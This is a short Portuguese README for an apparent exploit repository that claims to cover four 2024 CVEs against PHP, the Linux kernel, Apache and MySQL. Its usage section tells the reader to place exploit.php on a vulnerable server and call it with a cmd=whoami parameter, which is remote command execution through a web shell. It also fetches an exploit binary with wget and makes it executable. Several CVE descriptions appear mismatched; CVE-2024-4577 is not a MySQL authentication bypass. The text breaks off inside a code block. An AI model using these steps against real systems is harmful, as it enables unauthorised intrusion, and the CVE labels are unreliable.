# # Kali Linux Vulnerabilities

Este repositório contém scripts e tutoriais para explorar e corrigir vulnerabilidades de segurança em Kali Linux, focando em CVEs recentes.

## Estrutura do Repositório

- **CVE-2024-5585**: Exploração da Vulnerabilidade PHP Command Injection
- **CVE-2024-2408**: Exploração da Vulnerabilidade de Escalonamento de Privilégios no Kernel Linux
- **CVE-2024-5458**: Exploração da Vulnerabilidade RCE no Apache HTTP Server
- **CVE-2024-4577**: Exploração da Vulnerabilidade de Bypass de Autenticação no MySQL Server

## Exemplo de Uso

### CVE-2024-5585

1. **Hospedagem do Script:**
   - Coloque `exploit.php` em um servidor PHP vulnerável.

2. **Acesso ao Script:**
   - Use o navegador para acessar `http://192.168.1.10/exploit.php?cmd=whoami`.

### CVE-2024-2408

1. **Baixar e Tornar Executável:**

   ```bash
   wget https://example.com/exploit_CVE-2024-2408 -O exploit_CVE-2024-2408
   chmod +x exploit_CVE-2024-2408